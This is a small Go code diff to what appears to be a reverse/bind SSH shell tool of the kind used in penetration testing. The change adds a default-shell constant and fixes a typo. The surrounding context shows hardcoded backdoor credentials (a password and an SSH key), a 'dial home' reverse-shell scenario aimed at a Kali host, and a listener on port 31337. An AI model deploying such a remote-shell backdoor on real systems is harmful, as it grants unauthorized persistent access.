@@ -38,6 +38,7 @@ import (
 var (
 	localPassword = "letmeinbrudipls"
 	authorizedKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi"
+	defaultShell  = "/bin/bash"
 	version       = "0.0.0-dev"
 )
 
@@ -54,21 +55,21 @@ Examples:
 	%[1]s -v -b 0 kali@192.168.0.2
 
 Options:
-	-s, Shell to use for incoming connections, e.g. /bin/bash; no effect for windows (default: /bin/bash)
+	-s, Shell to use for incoming connections, e.g. /bin/bash; no effect for windows (default: %[5]s)
 	-l, Bind scenario only: listen at this address:port (default: :31337)
 	-p, Reverse scenario only: ssh port at home (default: 22)
 	-b, Reverse scenario only: bind to this port after dialling home (default: 8888)
 	-v, Emit log output
 
 <target>
-	Optional target which enables the reverse scenario. Can be prependend with
+	Optional target which enables the reverse scenario. Can be prepended with
 	<user>@ to authenticate as a different user than 'reverse' while dialling home.
 
 Credentials:
 	Accepting all incoming connections from any user with either of the following:
 	 * Password "%[3]s"
 	 * PubKey   "%[4]s"
-`, path.Base(os.Args[0]), version, localPassword, authorizedKey)
+`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell)
 
 func dialHomeAndServe(homeTarget string, homeBindPort uint, server ssh.Server) error {
 	var (
@@ -165,7 +166,7 @@ func main() {
 
 	flag.UintVar(&homeSshPort, "p", 22, "")
 	flag.UintVar(&homeBindPort, "b", 8888, "")
-	flag.StringVar(&shell, "s", "/bin/bash", "")
+	flag.StringVar(&shell, "s", defaultShell, "")
 	flag.StringVar(&bindAddr, "l", ":31337", "")
 	flag.BoolVar(&verbose, "v", false, "")
 	flag.Parse()
